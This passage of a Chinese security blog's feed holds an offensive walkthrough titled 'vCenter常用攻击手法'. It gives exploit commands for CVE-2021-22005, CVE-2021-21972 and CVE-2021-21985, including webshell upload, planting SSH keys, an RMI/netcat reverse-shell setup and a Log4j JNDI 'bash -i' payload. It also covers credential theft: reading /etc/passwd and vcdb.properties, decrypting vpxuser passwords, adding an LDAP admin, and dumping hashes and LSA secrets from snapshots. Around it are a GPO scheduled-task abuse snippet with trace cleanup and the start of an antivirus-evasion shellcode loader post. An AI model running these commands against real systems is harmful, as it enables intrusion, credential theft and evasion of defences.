id="3-1、工具创建"><a href="#3-1、工具创建" class="headerlink" title="3.1、工具创建"></a>3.1、工具创建</h3><p><a href="https://github.com/3gstudent/Homework-of-Powershell" target="_blank" rel="noopener">New-GPOImmediateTask.ps1</a></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">## 导入ps1</span><br><span class="line">Import-Module GroupPolicy –verbose</span><br><span class="line"></span><br><span class="line">## 执行脚本添加计划任务</span><br><span class="line">New-GPOImmediateTask -TaskName Debugging -GPODisplayName TestGPO -SysPath <span class="string">'\\dc\sysvol\test1.local'</span> -CommandArguments <span class="string">'-c "123 | Out-File C:\test\debug.txt"'</span></span><br><span class="line"></span><br><span class="line">## 强制更新组策略，或者默认等待<span class="number">90</span>分组等待组策略强制更新</span><br><span class="line">Invoke-GPUpdate -Computer <span class="string">"TEST\COMPUTER-01"</span></span><br><span class="line"></span><br><span class="line">## 清理痕迹</span><br><span class="line">Remove-GPO -Name TestGPO</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;大部份的公司的局域网都用到域服务来管理办公电脑，而域管理最主要的就是域策略配置，策略配置的好可以大大增加局域网的安全性。配置不当可称为攻击者后渗透的攻击手段。&lt;/p&gt;</summary>
    
    
    
    
    <category term="Windows" scheme="https://chenzidu.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>vCenter常用攻击手法</title>
    <link href="https://chenzidu.github.io/2022/11/22/vCenter%E5%B8%B8%E7%94%A8%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/"/>
    <id>https://chenzidu.github.io/2022/11/22/vCenter%E5%B8%B8%E7%94%A8%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/</id>
    <published>2022-11-22T09:30:35.000Z</published>
    <updated>2022-12-11T09:31:21.954Z</updated>
    
    <content type="html"><![CDATA[<h2 id="查看版本信息"><a href="#查看版本信息" class="headerlink" title="查看版本信息"></a>查看版本信息</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/sdk/</span>vimServiceVersions.xml</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="0x01-cve-2021-22005"><a href="#0x01-cve-2021-22005" class="headerlink" title="0x01 cve-2021-22005"></a>0x01 cve-2021-22005</h2><h3 id="1-1-影响范围："><a href="#1-1-影响范围：" class="headerlink" title="1.1 影响范围："></a>1.1 影响范围：</h3><ul><li><p>vCenter Server 7.0 &lt; 7.0 U2c build-18356314</p></li><li><p>vCenter Server 6.7 &lt; 6.7 U3o build-18485166</p></li><li><p>Cloud Foundation (vCenter Server) 4.x &lt; KB85718 (4.3)</p></li><li><p>Cloud Foundation (vCenter Server) 3.x &lt; KB85719 (3.10.2.2)</p><p> 6.7 vCenters Windows版本不受影响</p></li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python3</span> .\<span class="built_in">exp</span>.<span class="keyword">py</span> -t http<span class="variable">s:</span>//<span class="number">192.168</span>.<span class="number">52.152</span> -s api_all_jdk.jsp</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1664014622336-8dab8ce0-bc46-4016-afe2-8f4821d7db00.png#clientId=u12ac482d-9ee3-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=159&id=u4359cdbb&margin=%5Bobject%20Object%5D&name=image.png&originHeight=238&originWidth=1726&originalType=binary&ratio=1&rotation=0&showTitle=false&size=42685&status=error&style=none&taskId=u706fb7ad-ac4d-49ce-ae07-836cdc7f65a&title=&width=1150.6666666666667" alt="image.png"><br>连接木马，默认路径&#x2F;storage&#x2F;db&#x2F;vmware-vmdir&#x2F;data.mdb<br><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1664014721247-a2c27eb9-6e57-4133-a64e-172d52b972cd.png#clientId=u12ac482d-9ee3-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=800&id=uf9dfad31&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1200&originWidth=1650&originalType=binary&ratio=1&rotation=0&showTitle=false&size=134826&status=error&style=none&taskId=u93328a43-469e-4aa2-b0af-87227c90a2d&title=&width=1100" alt="image.png"></p><h3 id="1-2-vcenter-saml-login"><a href="#1-2-vcenter-saml-login" class="headerlink" title="1.2 vcenter_saml_login"></a>1.2 vcenter_saml_login</h3><p>db数据库存放位置</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">数据库存放路径</span><br><span class="line">Windows vCenter：<span class="string">C:</span><span class="regexp">/ProgramData/</span>VMware<span class="regexp">/vCenterServer/</span>data<span class="regexp">/vmdird/</span>data.mdb</span><br><span class="line">Linux vCenter：<span class="regexp">/storage/</span>db<span class="regexp">/vmware-vmdir/</span>data.mdb</span><br></pre></td></tr></table></figure><p>拖到本地利用：vcenter_saml_login<br>配置cmd代理，利用netch到本地127.0.0.1:1080</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">python3</span> <span class="selector-tag">vcenter_saml_login</span><span class="selector-class">.py</span> <span class="selector-tag">-p</span> <span class="selector-tag">data</span><span class="selector-class">.mdb</span> <span class="selector-tag">-t</span> 10<span class="selector-class">.118</span><span class="selector-class">.11</span><span class="selector-class">.220</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1664014667035-e0e7827b-d992-407f-96d6-2bd167a03dbc.png#clientId=u12ac482d-9ee3-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=280&id=u0bc9599a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=420&originWidth=1438&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63941&status=error&style=none&taskId=u88852a40-3796-45f0-b970-a6b66fcdae2&title=&width=958.6666666666666" alt="image.png"><br>修改cookie进行连接<br><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1664014858229-ccfa2893-e26e-4b44-b3d8-1892bc85f2fb.png#clientId=u12ac482d-9ee3-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=979&id=u810e6ad5&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1468&originWidth=2560&originalType=binary&ratio=1&rotation=0&showTitle=false&size=483906&status=error&style=none&taskId=u9cf5e640-fd71-472e-977b-2818d83976b&title=&width=1706.6666666666667" alt="image.png"></p><h2 id="0x02-CVE-2021-21972"><a href="#0x02-CVE-2021-21972" class="headerlink" title="0x02 CVE-2021-21972"></a>0x02 CVE-2021-21972</h2><p>影响范围</p><ul><li>vCenter Server7.0 &lt; 7.0.U1c</li><li>vCenter Server6.7 &lt; 6.7.U3l</li><li>vCenter Server6.5 &lt; 6.5.U3n<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/ui/</span>vropspluginui<span class="regexp">/rest/</span>services<span class="regexp">/uploadova</span></span><br></pre></td></tr></table></figure>访问上面的路径，如果404，则代表不存在漏洞，如果405 则可能存在漏洞。</li></ul><h3 id="2-1-windows机器："><a href="#2-1-windows机器：" class="headerlink" title="2.1 windows机器："></a>2.1 windows机器：</h3><p>漏洞利用： <a href="https://github.com/horizon3ai/CVE-2021-21972" target="_blank" rel="noopener">https://github.com/horizon3ai/CVE-2021-21972</a></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2021-21972.py -t x.x.x.x -p c:<span class="symbol">\\</span>ProgramData<span class="symbol">\V</span>Mware<span class="symbol">\v</span>CenterServer<span class="symbol">\d</span>ata<span class="symbol">\p</span>erfcharts<span class="symbol">\t</span>c-instance<span class="symbol">\w</span>ebapps<span class="symbol">\s</span>tatsreport<span class="symbol">\g</span>sl.jsp -o win -f gsl.jsp</span><br><span class="line"></span><br><span class="line">-t （目标地址）</span><br><span class="line">-f （上传的文件）</span><br><span class="line">-p （上传后的webshell路径，默认不用改）</span><br></pre></td></tr></table></figure><p>上传后路径</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">https:</span><span class="comment">//x.x.x.x/statsreport/gsl.jsp</span></span><br><span class="line"><span class="string">C:</span><span class="regexp">/ProgramData/</span>VMware<span class="regexp">/vCenterServer/</span>data<span class="regexp">/perfcharts/</span>tc-instance<span class="regexp">/webapps/</span>statsreport</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1666943631368-67be46a7-d4ae-4f7f-989c-7d3d90165efd.png#clientId=uff4985c1-1738-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=636&id=u2f99974f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=954&originWidth=1730&originalType=binary&ratio=1&rotation=0&showTitle=false&size=141792&status=error&style=none&taskId=u146f1450-a6cd-44a5-baa9-cba412a8694&title=&width=1153.3333333333333" alt="image.png"></p><h3 id="2-2-linux机器"><a href="#2-2-linux机器" class="headerlink" title="2.2 linux机器"></a>2.2 linux机器</h3><p>1、写公私钥（需要22端口开放）</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE<span class="number">-2021</span><span class="number">-21972.</span>py -t <span class="number">10.16</span><span class="number">.8</span><span class="number">.168</span> -p /home/vsphere-ui/.ssh/authorized_keys -o unix -f c:<span class="comment">//Users/think/.ssh/id_rsa.pub</span></span><br></pre></td></tr></table></figure><p>2、遍历写shell（时间较久）<br><a href="https://github.com/NS-Sp4ce/CVE-2021-21972" target="_blank" rel="noopener">https://github.com/NS-Sp4ce/CVE-2021-21972</a><br><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1664443620010-0610d5fc-4467-4560-af43-b147c1b7cb71.png#clientId=u04e4c8d1-ce4e-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&id=uc39792dc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=949&originWidth=1891&originalType=url&ratio=1&rotation=0&showTitle=false&size=318120&status=error&style=none&taskId=u89c88664-6d75-434c-94f5-f1e6f7d82bc&title=" alt="image.png"></p><h2 id="0x03-CVE-2021-21985"><a href="#0x03-CVE-2021-21985" class="headerlink" title="0x03 CVE-2021-21985"></a>0x03 CVE-2021-21985</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">java -cp  JNDI-Injection-Bypass<span class="number">-1.0</span>-SNAPSHOT-all.jar payloads.EvilRMIServer <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span></span><br><span class="line"></span><br><span class="line">nc -lvvp <span class="number">55552</span></span><br><span class="line"></span><br><span class="line">python3 cve<span class="number">-2021</span><span class="number">-21985.</span>py https:<span class="comment">//host rmi://8.8.8.8:1099/Exploit</span></span><br></pre></td></tr></table></figure><h2 id="0x04-Log4j"><a href="#0x04-Log4j" class="headerlink" title="0x04 Log4j"></a>0x04 Log4j</h2><p>${jndi:ldap:&#x2F;&#x2F;exp}</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">java </span>-<span class="keyword">jar </span><span class="keyword">JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar </span>-C <span class="string">"cmd /c whoami"</span> -A <span class="string">"172.30.84.134"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">java </span>-<span class="keyword">jar </span><span class="keyword">JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar </span>-C <span class="string">"bash -c &#123;echo,base编码内容&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span> -A <span class="string">"ip"</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1666938590825-b0a1315f-9b40-41be-86cc-011aef38a4a0.png#clientId=uff4985c1-1738-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=315&id=u4b5ed440&margin=%5Bobject%20Object%5D&name=image.png&originHeight=472&originWidth=538&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59858&status=error&style=none&taskId=u039db2a0-d248-438e-8146-10e8dbb8fee&title=&width=358.6666666666667" alt="image.png"></p><h2 id="0x05-vmware未授权任意文件读取漏洞"><a href="#0x05-vmware未授权任意文件读取漏洞" class="headerlink" title="0x05 vmware未授权任意文件读取漏洞"></a>0x05 vmware未授权任意文件读取漏洞</h2><h3 id="5-1、漏洞影响版本"><a href="#5-1、漏洞影响版本" class="headerlink" title="5.1、漏洞影响版本"></a>5.1、漏洞影响版本</h3><p>已知影响版本 VMware vCenter 6.5.0a-f<br>安全版本 VMware vCenter 6.5u1</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#windows</span></span><br><span class="line">/eam/vib?<span class="attribute">id</span>=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties</span><br><span class="line"></span><br><span class="line"><span class="comment">#linux</span></span><br><span class="line">/eam/vib?<span class="attribute">id</span>=/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1664111112270-a885b799-b7a6-48a6-9be5-784341846266.png#clientId=u5514ee4d-e108-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&id=ubdba19ae&margin=%5Bobject%20Object%5D&name=image.png&originHeight=803&originWidth=1778&originalType=url&ratio=1&rotation=0&showTitle=false&size=187525&status=error&style=none&taskId=u70e00efe-f5f9-437b-8aae-0e46de424ba&title=" alt="image.png"></p><h2 id="0x06-vCenter低权限账户提权思路"><a href="#0x06-vCenter低权限账户提权思路" class="headerlink" title="0x06 vCenter低权限账户提权思路"></a>0x06 vCenter低权限账户提权思路</h2><h3 id="6-1、获取ssh权限后修改密码"><a href="#6-1、获取ssh权限后修改密码" class="headerlink" title="6.1、获取ssh权限后修改密码"></a>6.1、获取ssh权限后修改密码</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Linux </span></span><br><span class="line">/usr/lib/vmware-vmdir/bin/vdcadmintool </span><br><span class="line"></span><br><span class="line"><span class="comment">#Windows </span></span><br><span class="line">C:\Program Files\Vmware\vCenter Server\vmdird\vdcadmintool.exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入3回车</span></span><br><span class="line"><span class="comment"># 然后输入用户名(用户名输入错误会提示：VmDirForceResetPassword failed (9106))</span></span><br><span class="line"><span class="comment"># 复制生成的新密码(新密码不能自定义，只能工具生成的)</span></span><br><span class="line">==================</span><br><span class="line">Please <span class="keyword">select</span>:</span><br><span class="line"><span class="number">0.</span> <span class="keyword">exit</span></span><br><span class="line"><span class="number">1.</span> <span class="keyword">Test</span> LDAP connectivity</span><br><span class="line"><span class="number">2.</span> <span class="keyword">Force</span> <span class="keyword">start</span> <span class="keyword">replication</span> <span class="keyword">cycle</span></span><br><span class="line"><span class="number">3.</span> <span class="keyword">Reset</span> <span class="keyword">account</span> <span class="keyword">password</span></span><br><span class="line"><span class="number">4.</span> <span class="keyword">Set</span> <span class="keyword">log</span> <span class="keyword">level</span> <span class="keyword">and</span> <span class="keyword">mask</span></span><br><span class="line"><span class="number">5.</span> <span class="keyword">Set</span> vmdir state</span><br><span class="line"><span class="number">6.</span> <span class="keyword">Get</span> vmdir state</span><br><span class="line"><span class="number">7.</span> <span class="keyword">Get</span> vmdir <span class="keyword">log</span> <span class="keyword">level</span> <span class="keyword">and</span> <span class="keyword">mask</span></span><br><span class="line">==================</span><br></pre></td></tr></table></figure><h3 id="6-2、Vmware数据库配置文件"><a href="#6-2、Vmware数据库配置文件" class="headerlink" title="6.2、Vmware数据库配置文件"></a>6.2、Vmware数据库配置文件</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># linux</span></span><br><span class="line"><span class="meta-keyword">/etc/</span>vmware-vpx/vcdb.properties</span><br><span class="line"><span class="meta-keyword">/etc/</span>vmware<span class="meta-keyword">/service-state/</span>vpxd/vcdb.properties</span><br><span class="line"></span><br><span class="line"><span class="meta"># windows</span></span><br><span class="line"><span class="symbol">C:</span>\ProgramData\VMware\vCenterServer\cfg\vmware-vps\vcdb.properties</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1664177386905-d4cccd39-b526-439d-8007-139f046edbee.png#clientId=u5514ee4d-e108-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=142&id=u771bee9a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=213&originWidth=660&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24805&status=error&style=none&taskId=u962835c6-dfcd-465d-abf5-47c35138d61&title=&width=440" alt="image.png"></p><h4 id="连接数据库，读取-vpxuser-密钥"><a href="#连接数据库，读取-vpxuser-密钥" class="headerlink" title="连接数据库，读取 vpxuser 密钥"></a>连接数据库，读取 vpxuser 密钥</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># linux</span></span><br><span class="line"><span class="string">/opt/vmware/vpostgres/current/bin/psql</span> <span class="string">-h</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="string">-p</span> <span class="number">5432</span> <span class="string">-U</span> <span class="string">vc</span> <span class="string">-d</span> <span class="string">VCDB</span> <span class="string">-c</span> <span class="string">"select ip_address,user_name,password from vpx_host;"</span> <span class="string">&gt;</span> <span class="string">password.enc</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#windows</span></span><br><span class="line"><span class="string">C:\Program</span> <span class="string">Files\VMware\vCenter</span> <span class="string">Server\vPostgres\bin\psql.exe</span> <span class="string">-h</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="string">-p</span> <span class="number">5432</span> <span class="string">-U</span> <span class="string">vc</span> <span class="string">-d</span> <span class="string">VCDB</span> <span class="string">-c</span> <span class="string">"select ip_address,user_name,password from vpx_host;"</span> <span class="string">&gt;</span> <span class="string">password.enc</span></span><br></pre></td></tr></table></figure><h3 id="6-3、获取symkey-dat文件"><a href="#6-3、获取symkey-dat文件" class="headerlink" title="6.3、获取symkey.dat文件"></a>6.3、获取symkey.dat文件</h3><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># linux</span><br><span class="line">/etc/vmware-vpx/ssl/symkey.dat</span><br><span class="line"></span><br><span class="line"># windows</span><br><span class="line">C:<span class="symbol">\P</span>rogramData<span class="symbol">\V</span>Mware<span class="symbol">\v</span>CenterServer<span class="symbol">\c</span>fg<span class="symbol">\v</span>mware-vpx<span class="symbol">\s</span>sl<span class="symbol">\s</span>ymkey.dat</span><br></pre></td></tr></table></figure><h4 id="解密-vpxuser-密码"><a href="#解密-vpxuser-密码" class="headerlink" title="解密 vpxuser 密码"></a>解密 vpxuser 密码</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">python3</span> <span class="selector-tag">decrypt</span><span class="selector-class">.py</span> <span class="selector-tag">symkey</span><span class="selector-class">.dat</span> <span class="selector-tag">password</span><span class="selector-class">.enc</span> <span class="selector-tag">password</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure><h3 id="6-4、拿到权限后添加账户"><a href="#6-4、拿到权限后添加账户" class="headerlink" title="6.4、拿到权限后添加账户"></a>6.4、拿到权限后添加账户</h3><h4 id="添加账户"><a href="#添加账户" class="headerlink" title="添加账户"></a>添加账户</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> vCenterLDAP_Manage.<span class="keyword">py</span> adduser</span><br><span class="line"><span class="built_in">input</span> the <span class="keyword">new</span> username: <span class="number">1234</span>admininput the dn: <span class="keyword">cn</span>=<span class="number">1234</span>admin,<span class="keyword">cn</span>=Users,dc=vsphere,dc=localinput the userPrincipalName: <span class="number">1234</span>admin@vsphere.local</span><br></pre></td></tr></table></figure><h4 id="提升至管理员"><a href="#提升至管理员" class="headerlink" title="提升至管理员"></a>提升至管理员</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vCenterLDAP_Manage.py addadmininput the<span class="built_in"> user </span>dn: <span class="attribute">cn</span>=1234admin,cn=Users,dc=vsphere,dc=local</span><br></pre></td></tr></table></figure><h3 id="0x07后续"><a href="#0x07后续" class="headerlink" title="0x07后续"></a>0x07后续</h3><h4 id="7-1、创建快照"><a href="#7-1、创建快照" class="headerlink" title="7.1、创建快照"></a>7.1、创建快照</h4><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1666945673264-ff04ef79-902d-48ea-9d44-2630c61f4644.png#clientId=uff4985c1-1738-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=695&id=uf160b882&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1043&originWidth=1711&originalType=binary&ratio=1&rotation=0&showTitle=false&size=220842&status=error&style=none&taskId=u2476fa89-caf4-4bbf-a5c0-06bc91334cc&title=&width=1140.6666666666667" alt="image.png"><br>分析快照文件需要.vmem文件作为参数，而.vmem文件通常很大，为了提高效率，这里选择将volatility上传至VMware ESXI，在VMware ESXI上分析快照文件。</p><h5 id="volatility下载：【Windows】、【Linux】"><a href="#volatility下载：【Windows】、【Linux】" class="headerlink" title="volatility下载：【Windows】、【Linux】"></a>volatility下载：【<a href="http://downloads.volatilityfoundation.org/releases/2.6/volatility_2.6_win64_standalone.exe" target="_blank" rel="noopener">Windows</a>】、【<a href="http://downloads.volatilityfoundation.org/releases/2.6/volatility_2.6_lin64_standalone.zip" target="_blank" rel="noopener">Linux</a>】</h5><h3 id="7-2-volatility利用"><a href="#7-2-volatility利用" class="headerlink" title="7.2 volatility利用"></a>7.2 volatility利用</h3><h5 id="7-2-1、通过镜像信息获得系统版本，命令如下"><a href="#7-2-1、通过镜像信息获得系统版本，命令如下" class="headerlink" title="7.2.1、通过镜像信息获得系统版本，命令如下"></a>7.2.1、通过镜像信息获得系统版本，命令如下</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\<span class="selector-tag">volatility_2</span><span class="selector-class">.6_win64_standalone</span><span class="selector-class">.exe</span> <span class="selector-tag">-f</span> <span class="selector-tag">xxxx-Snapshot2</span><span class="selector-class">.vmem</span> <span class="selector-tag">imageinfo</span></span><br></pre></td></tr></table></figure><h5 id="7-2-2、读取profile，列出注册表内容"><a href="#7-2-2、读取profile，列出注册表内容" class="headerlink" title="7.2.2、读取profile，列出注册表内容"></a>7.2.2、读取profile，列出注册表内容</h5><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.<span class="symbol">\v</span>olatility_2.6_win64_standalone.exe -f xxx-Snapshot2.vmem --profile=xxx hivelist</span><br><span class="line"></span><br><span class="line">## 关注</span><br><span class="line">REGISTRY<span class="symbol">\M</span>ACHINE<span class="symbol">\S</span>YSTEM</span><br><span class="line">SystemRoot<span class="symbol">\S</span>ystem32<span class="symbol">\C</span>onfig<span class="symbol">\S</span>AM</span><br></pre></td></tr></table></figure><h5 id="7-2-3、使用hashdump获取hash值"><a href="#7-2-3、使用hashdump获取hash值" class="headerlink" title="7.2.3、使用hashdump获取hash值"></a>7.2.3、使用hashdump获取hash值</h5><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\volatility_2<span class="number">.6</span>_win64_standalone.exe -f xxx-Snapshot2.vmem --profile=xxx hashdump -y <span class="number">0xfffff8a000024010</span> -s <span class="number">0xfffff8a000478010</span></span><br></pre></td></tr></table></figure><h5 id="7-2-4、从注册表读取LSA-Secrets"><a href="#7-2-4、从注册表读取LSA-Secrets" class="headerlink" title="7.2.4、从注册表读取LSA Secrets"></a>7.2.4、从注册表读取LSA Secrets</h5><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\volatility_2.<span class="number">6_</span>win64_standalone.exe -f xxx-<span class="module-access"><span class="module"><span class="identifier">Snapshot2</span>.</span></span>vmem --profile=xxx lsadump</span><br></pre></td></tr></table></figure><h5 id="7-2-5、导出所有域用户hash"><a href="#7-2-5、导出所有域用户hash" class="headerlink" title="7.2.5、导出所有域用户hash"></a>7.2.5、导出所有域用户hash</h5><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://forum.butian.net/share/1893" target="_blank" rel="noopener">https://forum.butian.net/share/1893</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;查看版本信息&quot;&gt;&lt;a href=&quot;#查看版本信息&quot; class=&quot;headerlink&quot; title=&quot;查看版本信息&quot;&gt;&lt;/a&gt;查看版本信息&lt;/h2&gt;&lt;figure class=&quot;highlight awk&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;regexp&quot;&gt;/sdk/&lt;/span&gt;vimServiceVersions.xml&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
    <category term="vCenter" scheme="https://chenzidu.github.io/tags/vCenter/"/>
    
  </entry>
  
  <entry>
    <title>C++变形免杀初探（一）</title>
    <link href="https://chenzidu.github.io/2022/09/22/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://chenzidu.github.io/2022/09/22/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2022-09-22T06:50:05.000Z</published>
    <updated>2024-03-11T07:47:58.301Z</updated>
    
    <content type="html"><![CDATA[<p>好久没水文章了，最近一段时间一直在忙项目上的事情。&#x3D; &#x3D;</p><a id="more"></a><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>shellcode -&gt; 加密算法 -&gt;生成恶意加密shellcode -&gt;加载器 -&gt;解密算法 -&gt; 执行恶意shellcode</li></ul><p>利用外部库来进行加解密操作，增加分析难度，可以加base64，不过base64可能会把不可见字符转换出问题，不过两层加密基本够了，太多层反而效率变慢了。</p><h3 id="外部库"><a href="#外部库" class="headerlink" title="外部库"></a>外部库</h3><ul><li>crypto</li><li>boost</li></ul><h2 id="加密部分"><a href="#加密部分" class="headerlink" title="加密部分"></a>加密部分</h2><h3 id="异或部分"><a href="#异或部分" class="headerlink" title="异或部分"></a>异或部分</h3><p>异或和位移，可以说是复杂度最低的算法了，效率高。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 